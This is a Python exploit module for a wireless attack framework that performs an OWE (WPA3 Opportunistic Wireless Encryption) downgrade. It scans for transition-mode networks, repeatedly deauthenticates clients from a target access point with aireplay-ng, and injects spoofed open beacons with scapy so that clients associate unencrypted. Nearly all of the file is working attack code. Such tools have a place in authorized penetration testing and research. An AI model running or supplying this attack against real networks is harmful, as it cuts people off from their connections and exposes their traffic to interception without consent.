#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""OWE (Opportunistic Wireless Encryption) downgrade attack module.

Forces WiFi clients and APs using OWE (IEEE 802.11s, WPA3-OWE) to fall
back to open (unencrypted) association by injecting spoofed beacons that
strip the OWE Transition Mode element or by deauthenticating clients from
the OWE BSS while advertising an open clone.

OWE provides unauthenticated encryption on open networks via Diffie-Hellman
key exchange. The downgrade exploits the OWE Transition Mode mechanism
where APs advertise both an open and OWE BSSID: by disrupting the OWE
BSSID, clients fall back to the open one.

References:
  RFC 8110 (Opportunistic Wireless Encryption)
  IEEE 802.11s (Mesh Networking, OWE basis)
  https://wpa3.mathyvanhoef.com/

MITRE ATT&CK: T1557.002 (ARP Cache Poisoning / WiFi), T1565 (Data Manipulation)
CWE: CWE-757 (Selection of Less-Secure Algorithm During Negotiation)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
import time
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)


class OWEDowngrade(Exploit):
    """OWE to Open downgrade attack module."""

    __info__: dict[str, Any] = {
        "name": "OWE Downgrade Attack",
        "description": (
            "Downgrade WiFi OWE (Opportunistic Wireless Encryption) connections "
            "to unencrypted open associations by disrupting the OWE BSS and "
            "forcing clients onto the open transition BSSID."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://tools.ietf.org/html/rfc8110",
            "https://wpa3.mathyvanhoef.com/",
        ),
        "devices": ("WiFi APs with OWE Transition Mode",),
        "severity": "high",
        "cvss": "7.5",
        "cve": "generic",
        "mitre": ["T1557", "T1565"],
    }

    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    target_bssid = OptString("", "OWE BSSID to disrupt")
    open_bssid = OptString("", "Open transition BSSID (auto-detected if empty)")
    channel = OptInteger(6, "Channel of the target AP")
    deauth_count = OptInteger(20, "Deauth frames per burst")
    beacon_interval = OptInteger(100, "Spoofed beacon interval (ms)")
    duration = OptInteger(60, "Attack duration in seconds")
    dry_run = OptBool(False, "Print commands without executing")

    def check(self) -> str:
        """Verify tools and interface."""
        for tool in ("airmon-ng", "aireplay-ng", "airodump-ng"):
            if not shutil.which(tool):
                return f"Required tool not found: {tool}"
        return "Aircrack-ng suite available"

    def _scan_owe_networks(self) -> list[dict[str, str]]:
        """Scan for networks advertising OWE Transition Mode."""
        print_status("[*] Scanning for OWE Transition Mode networks...")
        iface = str(self.interface.value)

        cmd = ["iw", "dev", iface, "scan", "-u"]
        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return []

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Scan failed: {exc}")
            return []

        networks: list[dict[str, str]] = []
        current_bss = ""
        current_ssid = ""
        has_owe = False

        for line in result.stdout.splitlines():
            stripped = line.strip()
            if stripped.startswith("BSS "):
                if current_bss and has_owe:
                    networks.append({"bssid": current_bss, "ssid": current_ssid})
                parts = stripped.split()
                current_bss = parts[1].rstrip("(").upper() if len(parts) >= 2 else ""
                current_ssid = ""
                has_owe = False
            elif "SSID:" in stripped:
                current_ssid = stripped.split("SSID:", 1)[-1].strip()
            elif "OWE" in stripped or "Transition Mode" in stripped:
                has_owe = True

        if current_bss and has_owe:
            networks.append({"bssid": current_bss, "ssid": current_ssid})

        for net in networks:
            print_success(f"    [+] OWE: {net['ssid']} ({net['bssid']})")
        return networks

    def _deauth_owe_bss(self) -> None:
        """Continuously deauthenticate clients from the OWE BSS."""
        target = str(self.target_bssid.value)
        iface = str(self.interface.value)
        count = int(self.deauth_count.value)

        print_status(f"[*] Deauthenticating clients from OWE BSS {target}")

        cmd = ["aireplay-ng", "--deauth", str(count), "-a", target, iface]
        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return

        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            print_success(f"[+] Sent {count} deauth frames to OWE BSS")
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Deauth failed: {exc}")

    def _spoof_open_beacon(self) -> None:
        """Inject beacons for the open transition BSSID with stronger signal."""
        open_bss = str(self.open_bssid.value or self.target_bssid.value)
        iface = str(self.interface.value)

        print_status("[*] Spoofing open beacon to attract clients")

        if self.dry_run.value:
            print_info(f"[dry-run] Would inject open beacons for {open_bss}")
            return

        try:
            from scapy.all import (  # type: ignore[import-untyped]
                Dot11,
                Dot11Beacon,
                Dot11Elt,
                RadioTap,
                sendp,
            )

            frame = (
                RadioTap()
                / Dot11(
                    type=0, subtype=8,
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=open_bss,
                    addr3=open_bss,
                )
                / Dot11Beacon(cap="ESS")
                / Dot11Elt(ID="SSID", info=b"")
            )
            sendp(frame, iface=iface, count=100, inter=0.01, verbose=False)
            print_success("[+] Injected 100 open beacons")
        except ImportError:
            print_error("[-] scapy required: pip install scapy")
        except Exception as exc:
            print_error(f"[-] Beacon injection failed: {exc}")

    def run(self) -> None:
        """Execute OWE downgrade attack."""
        print_status("[*] OWE Downgrade Attack v1.0.0")

        if not str(self.target_bssid.value):
            networks = self._scan_owe_networks()
            if not networks:
                print_warning("[!] No OWE networks found")
                return
            print_info("[*] Set target_bssid to attack a specific network")
            return

        duration = int(self.duration.value)
        end_time = time.time() + duration
        cycles = 0

        print_info(f"[*] Running for {duration}s against {self.target_bssid.value}")

        while time.time() < end_time:
            self._deauth_owe_bss()
            self._spoof_open_beacon()
            cycles += 1
            if self.dry_run.value:
                break
            time.sleep(1)

        print_success(f"[+] Completed {cycles} attack cycles")
        print_warning("[!] Clients should now associate with the open BSS")
